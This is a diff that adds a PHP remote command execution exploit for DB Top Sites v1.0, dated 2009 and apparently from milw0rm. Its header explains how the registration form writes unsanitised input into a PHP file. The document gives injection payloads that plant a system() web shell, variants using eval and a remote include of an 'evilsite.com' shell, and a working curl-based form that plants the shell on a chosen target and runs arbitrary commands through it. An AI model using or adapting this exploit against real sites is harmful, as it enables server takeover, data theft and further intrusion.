@@ -1,0 +1,163 @@
+<?php
+/*
+
+------------------------------------------------------------
+
+[+] About 
+
+DB Top Sites v1.0 Remote Command Execution Exploit
+Script homepage : http://www.jnmsolutions.co.uk/topsites/
+Author : SirGod
+Thanks to : Nytro
+Website : www.mortal-team.org
+
+------------------------------------------------------------
+
+[+] Usage 
+
+Upload the file to an webhost and access it.
+Site : the target website (WITH TRAILING SLASH)
+Command : the command that you want to execute
+Click Execute.The command output will be diplayed.
+After you executed the exploit once,the file can't be 
+replaced ( because the exploit create it by registering )
+and just hit the link in the top of the page
+and go back to execute another command.
+
+------------------------------------------------------------
+[+] Explanation 
+
+Lets take a look in add_reg.php
+
+Lines 14 - 22
+
+----------------------------------
+
+$user = $_POST['user'];
+$pass1 = $_POST['pass1'];
+$pass2 = $_POST['pass2'];
+$email1 = $_POST['email1'];
+$email2 = $_POST['email2'];
+$location = $_POST['location'];
+$url = $_POST['url'];
+
+$filename = "./sites/".$user.".php";
+
+-----------------------------------
+
+We can see that the script creates a php file ( username.php ),
+in our case,pwned.php.The script save all the user data in that
+file so we can inject our evil code into one field ( I chosen 
+the location field.
+
+Lines 112 - 121
+
+----------------------------------
+
+$html = "<?php
+\$regdate = \"$date\";
+\$user = \"$user\";
+\$pass = \"$pass1\";
+\$email = \"$email1\";
+\$location = \"$location\";
+\$url = \"$url\";
+?>";
+$fp = fopen($filename, 'a+');
+fputs($fp, $html) or die("Could not open file!");
+
+---------------------------------
+
+We see how data is added in the file,the variables
+including our evil code.
+
+So if we register as an user with the location :
+
+\";?><?php system(\$_GET['cmd']);?><?php \$xxx=\":D
+
+the code inside the php file ( pwned.php ) will
+look like this : 
+
+----------------------------------
+<?php
+$regdate = "13 June 2009, 4:16 PM";
+$user = "pwned";
+$pass = "pwned";
+$email = "pwned@yahoo.com";
+$location = "";?><?php system($_GET['cmd']);?><?php $xxx=":D";
+$url = "http://pwned.com";$plm=":)";
+?>
+---------------------------------
+
+So we can succesfully execute our commands.
+
+------------------------------------------------------------
+
+[+] Notes 
+
+You can change my PHP code ( $codphp ) with what you want.
+Example : 
+
+$codphp = "\";?><?php eval(\$_GET['cmd']);?><?php \$xxx=\":D";
+
+And you will be able to execute PHP code.
+
+Example 2 :
+
+$codphp = "\";?><?php include "http://evilsite.com/evilscript.txt";?><?php \$xxx=\":D";
+
+To include your evil script (shell).
+
+Session is used to verify if the exploit was launched 
+previously and if was launched previously the exploit
+will NOT try anymore to create the file and will let
+you to execute your commands.
+
+------------------------------------------------------------
+
+*/
+
+session_start();
+error_reporting(0);
+
+if(isset($_POST['submit']))
+{
+if(!isset($_SESSION['done']))
+{
+$codphp = "\";?><?php system(\$_GET['cmd']);?><?php \$xxx=\":D";
+define('POSTVARS','user=pwned&pass1=pwned&pass2=pwned&email1=pwned@yahoo.com&email2=pwned@yahoo.com&url=http://pwned.com";$plm=":)&location='.$codphp); 
+
+$site = $_POST['site'];
+
+$ch = curl_init($site . "add_reg.php");
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, POSTVARS);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0); 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+$data = curl_exec($ch);
+$_SESSION['done'] = 1;
+}
+$site = $_POST['site'];
+$result = file_get_contents($site . "sites/pwned.php?cmd=" . $_POST['cmd']);
+print "<a href=\"javascript:history.back();\">Click here to go back and execute another command</a><br /><br />";
+print "Command result: <br /><br />" . nl2br($result) . "<br /><br />";
+}
+
+else
+{
+
+?>
+
+<form method="post">
+Site: <input type="text" name="site" value="http://127.0.0.1/path/" /><br />
+Command: <input type="text" name="cmd" value="whoami" /><br /><br />
+<input type="submit" name="submit" value="Execute" />
+</form>
+
+<?php
+
+}
+
+?>
+
+# milw0rm.com [2009-06-15]
